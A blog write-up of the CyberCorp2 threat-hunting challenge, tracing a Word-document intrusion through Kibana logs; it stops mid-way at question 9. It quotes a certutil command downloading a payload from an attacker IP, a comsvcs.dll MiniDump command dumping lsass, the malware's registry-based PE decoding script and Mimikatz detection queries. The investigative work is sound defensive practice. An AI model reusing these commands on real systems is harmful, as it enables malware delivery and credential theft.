<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CyberCorp2 - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.eeb61b3f25f73088eb3aeb02bc61f28d33975f447fc5649add3b83c10059c331.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home 🏡">
      <a href="/">
        <span>Home 🏡</span>
      </a>
    </li>
    
    <li class="menu-item-blog ✍️">
      <a href="/docs/blog">
        <span>Blog ✍️</span>
      </a>
    </li>
    
    <li class="menu-item-forensics 🔍 and incident response 🥷">
      <a href="/docs/dfir">
        <span>Forensics 🔍 and Incident Response 🥷</span>
      </a>
    </li>
    
    <li class="menu-item-crypto 🗝️">
      <a href="/docs/cryptography">
        <span>Crypto 🗝️</span>
      </a>
    </li>
    
    <li class="menu-item-reverse 🔧">
      <a href="/docs/reverse">
        <span>Reverse 🔧</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit 🧰">
      <a href="/docs/toolkit">
        <span>Toolkit 🧰</span>
      </a>
    </li>
    
    <li class="menu-item-about me 🧝🏽‍♀️">
      <a href="/docs/about">
        <span>About me 🧝🏽‍♀️</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference 📚">
      <a href="/docs/reference">
        <span>Tech Reference 📚</span>
      </a>
    </li>
    
    <li class="menu-item-notes 📝">
      <a href="/docs/notes">
        <span>Notes 📝</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.svg" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home 🏡">
      <a href="/">
        <span>Home 🏡</span>
      </a>
    </li>
    
    <li class="menu-item-blog ✍️">
      <a href="/docs/blog">
        <span>Blog ✍️</span>
      </a>
    </li>
    
    <li class="menu-item-forensics 🔍 and incident response 🥷">
      <a href="/docs/dfir">
        <span>Forensics 🔍 and Incident Response 🥷</span>
      </a>
    </li>
    
    <li class="menu-item-crypto 🗝️">
      <a href="/docs/cryptography">
        <span>Crypto 🗝️</span>
      </a>
    </li>
    
    <li class="menu-item-reverse 🔧">
      <a href="/docs/reverse">
        <span>Reverse 🔧</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit 🧰">
      <a href="/docs/toolkit">
        <span>Toolkit 🧰</span>
      </a>
    </li>
    
    <li class="menu-item-about me 🧝🏽‍♀️">
      <a href="/docs/about">
        <span>About me 🧝🏽‍♀️</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference 📚">
      <a href="/docs/reference">
        <span>Tech Reference 📚</span>
      </a>
    </li>
    
    <li class="menu-item-notes 📝">
      <a href="/docs/notes">
        <span>Notes 📝</span>
      </a>
    </li>
    
  </ul>
</div>
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/blog/"> Back to Blog ✍️ Section 👈🏼 </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#case-details">Case Details</a></li>
    <li><a href="#questions">Questions</a>
      <ul>
        <li><a href="#1-wmi-event-consumer-name">1. WMI Event Consumer name?</a></li>
        <li><a href="#2-parent-pid-name">2. Parent PID Name?</a></li>
        <li><a href="#3-sha256-hash-of-the-file-extracted">3. SHA256 hash of the file extracted</a></li>
        <li><a href="#4-file-downloaded-hash">4. File downloaded Hash</a></li>
        <li><a href="#5-os-component-hash">5. OS component Hash</a></li>
        <li><a href="#6-malicious-domain-name">6. Malicious Domain Name</a></li>
        <li><a href="#7-md5-of-encoded-code">7. MD5 of Encoded code</a></li>
        <li><a href="#8-wmi-starters-sha256">8. WMI Starter&rsquo;s SHA256</a></li>
        <li><a href="#9-code-injection">9. Code Injection</a></li>
        <li><a href="#10-c2c">10. C2C</a></li>
        <li><a href="#11-path-of-and-hash-of-bloodhound">11. Path of and Hash of Bloodhound</a></li>
        <li><a href="#12-memory-dump">12. Memory dump</a></li>
        <li><a href="#13-login-and-password-of-a-privileges-account">13. Login And Password of a privileges account</a></li>
        <li><a href="#14-group-sid-of-the-compromised-account">14. Group SID of the compromised account</a></li>
        <li><a href="#ip-address-for-reverse-shell">IP address for Reverse Shell</a></li>
      </ul>
    </li>
    <li><a href="#strategy">Strategy</a>
      <ul>
        <li><a href="#timeline">Timeline</a></li>
      </ul>
    </li>
    <li><a href="#investigation">Investigation</a></li>
  </ul>
</nav>
 </aside>
 </div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">CyberCorp2</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      
      

      
      

      
    </div>
  </header>


  <div class="content" itemprop="articleBody">
    <p>⛔️  Spoiler alert!</p>
<h2 id="case-details">Case Details</h2>
<p>This is not an investigation like the previous one. This is threat hunting. So, we have only logs via Kibana available. To harden my knowledge with this technologies I&rsquo;ve had a very quick overview on ElasticStack website and enrolled in <a href="https://app.pluralsight.com/paths/skills/threat-hunting-with-the-elastic-stack">this</a> course. Basically, I will have to answer questing having a loads of logs and a query engine available.</p>
<h2 id="questions">Questions</h2>
<h3 id="1-wmi-event-consumer-name">1. WMI Event Consumer name?</h3>
<p>✅ <em>The Threat Hunting process usually starts with the analyst making a hypothesis about a possible compromise vector or techniques used by an attacker. In this scenario, your initial hypothesis is as follows: &ldquo;The attacker used the WMI subscription mechanism to obtain persistence within the infrastructure&rdquo;. Verify this hypothesis and find the name of the WMI Event Consumer used by the attacker to maintain his foothold.</em></p>
<p>I&rsquo;ve followed the URL in the VM, but there was nothing there. However, there was on port 5601. I opened <em>Discover</em> tab in Kibana. I was not very creative, so, I just filtered by <em>WMI</em> keyword. Then, I&rsquo;ve looked through the entries and added a <em>Consumer name</em> column (since this one does have a name). In the results, I&rsquo;ve found the most suspicious one and was right.</p>
<h3 id="2-parent-pid-name">2. Parent PID Name?</h3>
<p>✅ <em>In the previous step, you looked for traces of the attacker&rsquo;s persistence in the compromised system through a WMI subscription mechanism. Now find the process that installed the WMI subscription. Answer the question by specifying the PID of that process and the name of its executable file, separated by a comma without spaces.</em></p>
<p>The first idea that comes to mind is to find a field <code>parent_pid</code> or alike and see, which process was the initiator. Another way is to see, when the whole process of WMI subscription was initialized and set the time frame before that. Consumer binding (final step) took place at <code>23:26</code>, so we are looking for processes logs before that.</p>
<p>So, it happened on <code>June 21, 2021</code> 📆, at <code>23:25:47</code> 🕰 (doesn&rsquo;t look like opeational hours, by the way). So, I&rsquo;ve set the filter from the 21th of June 2021, from <code>23:00</code> till <code>23:30</code>. I&rsquo;ve also filtered by keyword <code>wmi</code>.</p>
<p>Right before our WMI event, there was another one: <code>winword.exe</code> process. It&rsquo;s process id can be seen in <code>proc_id</code> column (it was helpful to add it as a column). So, the whole attack might have been started due to the word doc opening. So, our indicator might be like: <code>a winword.exe process that starts a wmi subscription</code> which doesn&rsquo;t even sound ok.</p>
<p>Yeah! It wsa correct!</p>
<h3 id="3-sha256-hash-of-the-file-extracted">3. SHA256 hash of the file extracted</h3>
<p><em>The process described in the previous question was used to open a file extracted from the archive that user received by email. Specify a SHA256 hash of the file extracted and opened from the archive. Sample answer: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.</em></p>
<p>Moving back in time, I&rsquo;ll try to change the keyword to <code>winword.exe</code> and leave the timeframe the same. Though the time is not within operational hours, I still want to start as close to the WMI event as possible and then move backwards in time.</p>
<p>But first, I&rsquo;ll examine the event from the previous question. Looks like there is a field <code>proc_cmdline</code> specifying parameters when the process <code>winword</code> was launched. And the doc name is there too: <code>OPEC  crude oil production.docx</code>. So, let&rsquo;s filter by this keyword keeping the timeframe the same just yet. I will also add <code>file_sha256</code> field to ease the search.</p>
<p>Each time the word process loads a library, a new log entry is created. I would like to filter out all such events at least for now. And I want to opt in to <code>docx</code> files only. So, I&rsquo;m adding the filter <code>file_name:*.docx</code>.</p>
<p>We also need to keep in mind the sequence of events: email received -&gt; archive opened -&gt; opened with <code>winword.exe</code>. Add filter for <code>OUTLOOK.EXE</code>.</p>
<blockquote>
<p>⚠️ <code>n</code> switch seems malicious when used with <code>docx</code> files, since it opens a file without creating a window instance. <code>o</code>  switch doesn&rsquo;t have any description over the Internet.</p>
</blockquote>
<p><code>report.zip</code> - 1 hit, File Created. Some zip archive was saved to disk prior to the attack. However, no SHA256 was provided by the log files. Let&rsquo;s see the same folder. May something was created in the same folder&hellip; .</p>
<p>Somehow <code>NOT file_name:*.dll</code> didn&rsquo;t work. Search for <code>report.zip</code> returns only one result: file created by Outlook. Let&rsquo;s see who opened it and where was it moved or saved later?</p>
<p><code>event_type:FileOpen</code> and keyword <code>*.zip</code> -&gt; one hit again. Some <code>Temp_report.zip</code> file was decompressed to <code>market forecast emea.docx</code>, but no signs of the <code>report.zip</code> saved to the initial directory. However, in the process description there was <code>OPEC  crude oil production.docx</code> mentioned again. Was the zip file renamed and moved and then the file decompressed also renamed? That was the correct answer. Althout, I don&rsquo;t quite get the exact chain of events.</p>
<p>🚰 <strong>Filter</strong>: <code>file_name: *.zip</code>, time span: 📆 <code>June 21, 2021</code> ⏰ from <code>22:30</code> till <code>23:30</code>.</p>
<p>🚰 <strong>Filter</strong>:</p>
<ol>
<li>File downloaded and saved by <code>outlook.exe</code> as <code>report.exe</code> in the (filter: <code>event_type:FileCreate AND </code>)</li>
<li></li>
</ol>
<p>📈<strong>Timeline</strong>:</p>
<ol>
<li>📆 June 21st, 2021 at ⏰ 23:25:08 <code>report.zip</code> was created by outlook.exe proccess (FileCreate). At the same very time a <code>report (00000002).zip</code> was also created at the same very path. Probably, it was the same file, but the event might be coming from different location. However, <code>event_log_source</code> seems to be the same, <code>TH</code>. No hashes are provided 😔.</li>
<li><code>FileCreated</code> API was triggered by <code>outlook.exe</code>. File saved at <code>C:\Users\john.goldberg\appdata\local\microsoft\windows\inetcache\content.outlook\dfn3sfep\report (00000002).zip</code>.</li>
<li>Then some <code>temp1_report.zip</code> was also created by <code>explorer.exe</code>.</li>
</ol>
<h3 id="4-file-downloaded-hash">4. File downloaded Hash</h3>
<p><em>The file mentioned in question 3, is not malicious in and of itself, but when it is opened, another file is downloaded from the Internet that already contains the malicious code. Answer the question by specifying the address, from which this file was downloaded, and the SHA256 hash of the downloaded file, separated by commas without spaces.</em></p>
<p>🚰 <strong>Filter</strong>: <code>keyword: winword.exe AND Category: Network connection detected</code>.</p>
<p>Result in the <code>enrich.chain</code> field: <code>C:\Windows\explorer.exe -&gt; C:\Program Files (x86)\Microsoft Office\Office16\winword.exe -&gt; 188.135.15.49</code>. But this connection was initiated by the compromised PC at ⏰ 23:25:32. Seconds after report.zip was saved on the system.</p>
<p>🚰 <strong>Filter</strong>: 188.135.15.49</p>
<p>At  ⏰ 23:46:10 there were several download requests made via <code>cmd.exe</code> -&gt; <code>certutil.exe</code>.</p>
<p>Right after this 188.135.15.49.url is saved, another  request comind from cmd.exe is made (already suspicious). <code>certutil -urlcache -f http://188.135.15.49/chrome_installer.log2 C:\Windows\TEMP\chrome_installer.log2:data</code> (ADS?). <code>certutil</code> created a file (FileCreate). <strong>Path</strong> 🛣: <code>C:\Windows\System32\config\SystemProfile\AppData\LocalLow\Microsoft\cryptneturlcache\content\3255d8f28805ee17628e0d2c792ca827</code> and <code>C:\Windows\System32\config\SystemProfile\AppData\LocalLow\Microsoft\cryptneturlcache\metadata\3255d8f28805ee17628e0d2c792ca827</code>. Also, another file was saved by certutil: <code>C:\Windows\System32\config\SystemProfile\AppData\Local\Microsoft\Windows\Inetcache\IE\chrome_installer[1].log2</code>.</p>
<p>🚰 <strong>Filter</strong>: keyword: chrome_intaller.log2, Timespan expanded (21/06/2021 23:00 - 22/06/2021 01:30).</p>
<p>Then at ⏰ 23:46:16 certutil was used to decode the file downloaded and saved as at <code>C:\Windows\TEMP\svchost.exe</code>.</p>
<p>At  ⏰ 23:46:17 svchost was started (PID 3280) and SHA256 is 88EAE7C94142232FBB961DD8381FAEF23129B9F958BE283AE8393D28FED2092B. However, somehow the answer <em>188.135.15.49,88EAE7C94142232FBB961DD8381FAEF23129B9F958BE283AE8393D28FED2092B</em> was not correct. Hm, may be they require the hash of chrome_installer.log2? But there is nothing in file_sha256. Where am I supposed to get that one?</p>
<p>🚰 <strong>Filter</strong>: keyword: chrome_intaller, the timespan the same as previous.</p>
<p>Just one result: chrome_installer[1].log2 was found. What I find curious, is that chrome_installer.log2 wasn&rsquo;t.</p>
<p>🚰 <strong>Filter</strong>: event_type: FileCreate, the timespan is within 21/06/2021, from 23:46:00 to 23:50:00.</p>
<p>Lots of json files, going by the name, Bloodhound was in place, leaking users and domains.</p>
<p>🚰 <strong>Filter</strong>: event_type:NetworkConnection AND (net_src_ipv4:188.135.15.49 OR net_dst_ipv4:188.135.15.49)</p>
<p>In total, there were 7 hits. 5 initiated by winword.exe (at around 23:25) and 2 - later by certutil (at around 23:46).</p>
<p>🚰 <strong>Filter</strong>:  ( (cmdline:(<em>powershell</em> OR <em>SyncAppvPublishingServer</em> OR <em>pwsh</em>) OR proc_file_originalfilename:&ldquo;PowerShell.EXE&rdquo; OR proc_file_productname:&ldquo;PowerShell Core 6&rdquo; OR proc_file_description:&ldquo;Windows PowerShell&rdquo; OR event_log_source:PowerShell AND event_id:400) AND  cmdline:(&ldquo;Invoke-Mimikatz&rdquo; OR &ldquo;Invoke-ReflectivePEInjection&rdquo; OR &ldquo;Invoke-ReflectiveDllInjection&rdquo; OR &ldquo;Write-BytesToMemory&rdquo; OR &ldquo;Enable-SeDebugPrivilege&rdquo; OR &ldquo;Create-RemoteThread&rdquo;) ) OR (( (event_log_source:PowerShell AND event_id:800) OR (event_log_source:&ldquo;Microsoft-Windows-PowerShell&rdquo; AND event_id:4104) ) AND script_text:(&ldquo;Invoke-Mimikatz&rdquo; OR &ldquo;Invoke-ReflectivePEInjection&rdquo; OR &ldquo;Invoke-ReflectiveDllInjection&rdquo; OR &ldquo;Write-BytesToMemory&rdquo; OR &ldquo;Enable-SeDebugPrivilege&rdquo; OR &ldquo;Create-RemoteThread&rdquo;))</p>
<p>14 hits. 23:33 and 23:41</p>
<p>🚰 <strong>Filter</strong>: (cmdline:(<em>mimikatz</em> <em>DumpCerts</em> <em>DumpCreds</em> &ldquo;<em>invoke-mimikatz</em>&rdquo;)) OR (cmdline:(<em>kerberos</em> <em>sekurlsa</em> <em>logonpasswords</em> <em>lsadump</em> <em>privilege</em>) AND cmdline.keyword:<em>::</em>)</p>
<p>Nothing</p>
<p>🚰 <strong>Filter</strong>: event_type:NetworkConnection AND proc_file_path:(&quot;\excel.exe&quot; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\powerpnt.exe&rdquo;) AND (enrich.ti.net_dst_ipv4.categories:Malware OR enrich.ti.net_src_ipv4.categories:Malware)</p>
<p>5 hits, the same as above, when I filtered by a specific IP.</p>
<p>🚰 <strong>Filter</strong>: event_type:FileCreate AND proc_file_path:(&quot;\excel.exe&quot; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\powerpnt.exe&rdquo;) AND file_path.keyword:(*.exe OR *.dll OR *.cpl OR *.msi OR *.sys)</p>
<p>No need it excel or powerpoint, but I&rsquo;ve left them just in case. No results, anyway. Got 1 hit when added <code>OR *.ps1</code>.</p>
<p>🚰 <strong>Filter</strong>: event_type:ProcessCreate AND proc_p_file_path:(&quot;\excel.exe&quot; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\powerpnt.exe&rdquo;)  AND (proc_file_path:&quot;\cmd.exe&quot; OR cmdline:(cmd.exe &ldquo;*cmd *&rdquo;))</p>
<p>This filter shows when some office application launches a command line (that&rsquo;s not okay)! Nothing.</p>
<p>🚰 <strong>Filter</strong>: proc_file_path:&quot;\rundll32.exe&quot; AND cmdline.keyword:/.*#[0-9]+/</p>
<p>No dll function was executed via ordinal number through rundll32.exe. If I remove ordinal number requirement, I get 68 hits. At 23:50:14 this exe was used to create a memory dump at C:\Windows\Temp folder. Marked as credential dumping. The command was rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 748 C:\Windows\TEMP\dump.bin full. Looks like memdump with a built-in tool. 748 is the PID of the target process. What process is that? Presumably, lsass, but let&rsquo;s check with a filter.</p>
<p>The file that&rsquo;s mentioned in the question is obviously the Market Forecast Emea.docx that was opened at 23:27:15. The downloading should have occured right after that, so I need to narrow down the time frame.</p>
<h3 id="5-os-component-hash">5. OS component Hash</h3>
<p><em>The malicious code from the file, mentioned in question 4, directly installed a WMI subscription, which we started our hunting with, and also downloaded several files from the Internet to the compromised host. For file downloading, the attacker used a tricky technique that gave him the opportunity to hide the real process, which initiated the corresponding network activity. Specify the SHA256 hash of the operating system component whose functionality was used by the attacker to download files from the Internet.</em></p>
<p>Probably, they are asking about certutil&rsquo;s SHA. Hm, no. Seems to be some other technique. I&rsquo;ve got a hint from other resources that enrich.ioa.max_confidence:exists might be helpful. Besides, <a href="https://cyberpolygon.com/materials/hunting-for-advanced-tactics-techniques-and-procedures-ttps/">https://cyberpolygon.com/materials/hunting-for-advanced-tactics-techniques-and-procedures-ttps/</a> gives a hint about a possible technique: ieproxy.dll COM object. The filter would be either of the two:</p>
<ol>
<li>enrich.ioa.max_confidence:exists,  time frame between 23:24 and 23:30. Look for something right after WMI execution.</li>
<li>event_type:ImageLoad AND file_path:&quot;*\ieproxy.dll&quot; AND proc_file_path:(&quot;\cscript.exe&quot; OR &ldquo;\wscript.exe&rdquo; OR &ldquo;\powershell.exe&rdquo; OR &ldquo;\winword.exe&rdquo; OR &ldquo;\excel.exe&rdquo; &ldquo;\powerpnt.exe&rdquo; OR &ldquo;\mspub.exe&rdquo; OR &ldquo;\visio.exe&rdquo; OR &ldquo;\msaccess.exe&rdquo; OR &ldquo;\regsvr32.exe&rdquo;)</li>
</ol>
<p>5516176cd0f4204ef8cf563c1dd6b3991b134d17eef2cc5e62e7f6c7aadfbb37 - ieproxy.dll hash.</p>
<h3 id="6-malicious-domain-name">6. Malicious Domain Name</h3>
<p><em>Specify the domain name of the resource from which the files mentioned in question 5 were supposedly downloaded as a result of malicious code execution.</em></p>
<p>Right after the image load of the library above, there is a DNS request to <code>raw.githubusercontent.com</code>.</p>
<h3 id="7-md5-of-encoded-code">7. MD5 of Encoded code</h3>
<p><em>The first file downloaded (as a result of executing the code in question 5) contained encoded executable code (PE), which after downloading was recorded in the registry. Specify an MD5 hash of the original representation of that code (PE).</em></p>
<p>⏰ <code>23:26:03.000</code></p>
<p>The code was saved to registry, the same technique that was used in the previous challenge (CyberCorp). This event happened right after the ieproxy.dll load. The registry key is 🔑 : <code>hkey_current_user\software\registeredapplications\appxs42fd12c3po92dynnq2r142fs12qhvsmvv</code>.</p>
<p>When looking for an answer to the 8th question, I could see the code for the script. At the very beginning there was a decoding block. It&rsquo;s not hard to copy this data into PowerShell script to see the final result. I am going to add <code>event_log_source</code> column to look for Windows PowerShell logs, that usually log the script body as well. In the enrich.description I will be looking for [1 of 7], meaning the first part out of 7 of the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Process with PID <span class="s1">&#39;5952&#39;</span> execute a script <span class="o">(</span>powershell<span class="o">)</span> 📜️<span class="s1">&#39;c:\users\john.goldberg\appdata\roaming\microsoft\office\mso1033.ps1&#39;</span> <span class="o">[</span><span class="m">1</span> of 7<span class="o">]</span>
</span></span></code></pre></div><p>And here is the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span>
</span></span><span class="line"><span class="cl"><span class="nv">$rk</span> <span class="p">=</span> <span class="s2">&#34;HKU:\S-1-5-21-3899523589-2416674273-2941457644-1104\Software\RegisteredApplications&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$rv</span> <span class="p">=</span> <span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmvv&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
</span></span></code></pre></div><p>I will modify it a little (cropped the base64 strings here). A helpful resource <a href="https://gist.github.com/WalternativE/450b155c45f81b14290f8ded8324a283">here</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$rk</span> <span class="p">=</span> <span class="s2">&#34;H4sIAAAAAAAEAO1Y[...]QAAA==&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$rk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="no">[byte[]]</span> <span class="nv">$PEBytes</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hasher</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.HashAlgorithm]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hash</span> <span class="p">=</span> <span class="nv">$hasher</span><span class="p">.</span><span class="n">ComputeHash</span><span class="p">(</span><span class="nv">$PEBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hashString</span> <span class="p">=</span> <span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="nv">$hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hashString</span> <span class="p">=</span> <span class="nv">$hashString</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">Write-Output</span> <span class="nv">$hashString</span>
</span></span></code></pre></div><p>Yes! 🙌 I&rsquo;ve saved the executable with the following script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s2">&#34;H4sIA[...]==&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/veronicazvereva/Documents/dfir/cases/CyberPolygon2/malicious.exe&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">exe</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">),</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> 
</span></span></code></pre></div><p>Now, I need radare2 or IDA Pro to get some insight into what that code is doing. Luckily, the code is very small and should not be hard to untangle. From the very glance I&rsquo;ve recognized some process injection technique. Which one? I will use my own <a href="/docs/dfir/investigation/processes/injections/">article</a> to determine which one and also this <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf">one</a>.</p>
<p>Seems to be something in between the Process Hollowing and SIR (<strong>S</strong>uspend, <strong>I</strong>nject, <strong>R</strong>esume). The process is created by the malware, like in Process Hollowing, but instead of the whole executable being substituted, just the the thread of rundll32.exe is overwritten.</p>
<p><img src="images/ida1.png" alt="ida1"></p>
<p>This gives me another hint to look for in the future: rundll32.exe might is probably malicious now (if the code above was executed successfully).</p>
<h3 id="8-wmi-starters-sha256">8. WMI Starter&rsquo;s SHA256</h3>
<p><em>The second file downloaded (as a result of code execution, which we talked about in question 5) was a script, that was set up to autostart via WMI Subscription. Specify the SHA256 hash of this script.</em></p>
<p>If I observe the chain of event from the same filters, I see that there were two files were downloaded from raw.githubusercontent.com. The second one is obviously a PowerShell script, called mso1033.ps1. I need its hash though. The actual scrip is logged in Windows PowerShell Event Logs, but it&rsquo;s split into 7 part, recorded in 7 separate events, which will make is quite exhausting to assemble. It would be much better to look for simpler ways.</p>
<p>This script was started by wmiprvse.exe, so, it&rsquo;s our guy.</p>
<p>🚰 <strong>Filter</strong>: <code>mso1033.ps1</code> as a keyword, time frame 23:24-23:40 and <code>file_sha256:exists</code>.</p>
<p>Haha! Yes! 6df4709[&hellip;]49ef5. Great!</p>
<h3 id="9-code-injection">9. Code Injection</h3>
<p><em>The script, mentioned in question 8, spawned one of the legitimate system processes and injected into its memory a malicious code that was read and decoded from the registry (this code was mentioned in question 7). This malicious code migrated through a chain of code injections to the address space of another legitimate process, where it continued to run without further migration.</em>
<em>For this answer, provide the next data, separated by a comma without spaces:</em>
<em>- PID of the initial legitimate system process, which was spawned by the script and where this script launched in-memory execution of malicious code;</em>
<em>- PID of the target process, to which malicious code migrated from the initial process and in the context of which attacker performed different post-exploitation activity</em></p>
<p>The firdt process is most likely rundll32.exe, and the second is svchost.exe. I could not find anything by looking for rundll32. I&rsquo;ve decided to look through the ps1 script:</p>
